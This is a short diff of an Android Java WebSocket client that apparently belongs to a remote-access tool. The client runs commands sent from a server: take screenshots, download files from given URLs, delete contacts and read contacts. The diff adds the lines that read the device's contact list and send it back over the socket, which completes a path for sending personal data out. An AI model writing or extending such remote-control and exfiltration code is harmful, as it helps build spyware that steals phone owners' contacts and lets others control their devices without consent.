@@ -82,7 +82,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case DELETE_CONTACT:
-                    Phone.deleteContact(req.getString("name"), req.getString("number"));
+                    Phone.deleteContact(context, req.getString("name"), req.getString("number"));
                     break;
                 case DOWNLOAD_FILE:
                     FileManager.downloadFile(context, req.getString("url"), req.getString("filename"));
@@ -111,6 +111,8 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case READ_CONTACTS:
+                    json.put("contacts", mapToJson(Phone.readContacts(context)).toString());
+                    json.put("res", "contact");
                     break;
                 case SCREENSHOT:
                     path = Screenshot.captureScreen(context);
